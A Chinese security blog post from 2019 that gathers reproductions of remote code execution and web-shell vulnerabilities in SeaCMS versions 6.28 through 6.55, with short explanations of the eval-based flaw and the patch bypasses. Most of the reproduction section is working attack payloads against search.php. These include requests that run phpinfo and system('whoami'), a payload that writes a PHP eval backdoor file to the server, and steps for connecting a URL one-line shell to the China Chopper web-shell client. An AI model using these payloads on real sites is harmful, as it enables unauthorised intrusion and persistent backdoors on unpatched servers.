---
title:  海洋cms(SEACMS) 漏洞整合复现
date: 2019-11-04 19:38:32
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - 海洋cms
    - Seacms
    - 漏洞复现
    - Command Execution
---
# 0x00 漏洞概述

海洋CMS V6.28 存在命令执行漏洞，漏洞具体内容参见：
[ 海洋CMS V6.28 命令执行 0DAY](https://www.uedbox.com/post/8857/)

在2017年2月，海洋CMS 6.45版本存在一个前台getshell漏洞，漏洞具体内容参见：
[SeaCMS v6.45前台Getshell 代码执行漏洞分析](https://bbs.ichunqiu.com/thread-35085-1-1.html)
[Seacms漏洞分析利用复现 By Assassin - Assassin - CSDN博客](http://blog.csdn.net/qq_35078631/article/details/76595817)
该漏洞成因在于search.php没有对用户输入内容进行过滤，导致攻击者提交的order参数可进入parseIf函数中执行eval。  


官方在6.46版中修复了该漏洞，修复方法是对用户输入的参数进行过滤并限制长度为20个字符。
但这种修复方法并没有完全修复漏洞，因为在替换操作过程中用户输入的几个参数可以进行组合，因此补丁被绕过。  

随后官方又在8月7日发布了6.54版本再次修复漏洞，这次修复增加了一句：

`$order = ($order == "commend" || $order == "time" || $order == "hit") ? $order : "";`

即限制了order参数只能是固定内容，这样虽然避免了通过order参数进行的攻击，但是却没有解决其他参数进入parseIf函数的问题。

[漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警](https://www.freebuf.com/vuls/150042.html)


6.54版本更新中，官方给出的修复是在parseIf函数里面加了黑名单。
但是没有做SERVER变量的过滤，所以可以用SERVER变量的性质来达到写入命令。
 [SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)](https://bbs.ichunqiu.com/thread-35140-1-5.html)
 
# 0x01 漏洞复现
## 海洋CMS V6.28
详见：
[ 海洋CMS V6.28 命令执行 0DAY](https://www.uedbox.com/post/8857/)

一句话payload，密码`cmd`: 

`url+/search.php?searchtype=5&tid=&area=eval($_POST[cmd])`


## 海洋CMS V6.45
详见：
[SeaCMS v6.45前台Getshell 代码执行漏洞分析](https://bbs.ichunqiu.com/thread-35085-1-1.html)

path:
`url+/search.php`
POST:
`searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if}`

[【代码审计】seacms 前台Getshell分析](https://www.cnblogs.com/sqyysec/p/7765703.html)

path:
`url+/search.php`
```
searchtype=5&searchword=d&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=phpinfo();
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191105090018.png)


[seacms最新版前台getshell](https://www.cnblogs.com/bay1/p/10982344.html)
一句话payload，文件`test.php`  密码`pass`: 
path:
`url+/search.php`
```
}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen("test.php","w"),'<?php eval($_POST["pass"]);?>')
```

## 海洋CMS V6.54
详见：
[漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警](https://www.freebuf.com/vuls/150042.html)
[SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)](https://bbs.ichunqiu.com/thread-35140-1-5.html)

path:
`url+/search.php`
POST:
```
searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191105092054.png)


命令执行payload

path:
`url+/search.php`
POST:
```
searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=sy&9[]=stem("whoami");
```

url一句话拿shell
详见：
[记一次海洋cms任意代码执行漏洞拿shell(url一句话马)](https://zzreno.github.io/2019/05/19/记一次海洋cms任意代码执行漏洞拿shell-url一句话马/)

权限足够的话，`file_put_concents(“connect.php”,”“)`，然后连接菜刀即可。
权限不足的话，利用payload构造url：

`url+/search.php?searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))`

连接放入菜刀，密码是 `9[]`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191105094457.png)


## 海洋CMS V6.55

详见：
[SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)](https://bbs.ichunqiu.com/thread-35140-1-5.html)

path:
`url+/search.php`
POST:
```
searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*
```

# 参考文章
[ 海洋CMS V6.28 命令执行 0DAY](https://www.uedbox.com/post/8857/)
[SeaCMS v6.45前台Getshell 代码执行漏洞分析](https://bbs.ichunqiu.com/thread-35085-1-1.html)
[漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警](https://www.freebuf.com/vuls/150042.html)
[记一次海洋cms任意代码执行漏洞拿shell(url一句话马)](https://zzreno.github.io/2019/05/19/记一次海洋cms任意代码执行漏洞拿shell-url一句话马/)
[SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)](https://bbs.ichunqiu.com/thread-35140-1-5.html)


